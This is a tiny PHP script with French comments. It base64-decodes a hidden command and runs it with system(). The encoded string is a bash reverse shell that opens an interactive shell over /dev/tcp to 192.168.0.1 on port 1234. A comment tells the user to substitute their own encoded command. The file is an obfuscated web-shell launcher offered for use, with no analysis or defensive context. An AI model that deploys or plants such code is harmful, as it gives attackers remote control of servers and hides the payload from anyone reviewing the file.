<?php
// Décode une commande encodée en base64
$cmd = base64_decode('YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMS8xMjM0IDA+JjEi'); // Remplacez par votre commande encodée en base64

// Exécute la commande décodée en utilisant la fonction system
system($cmd);
?>
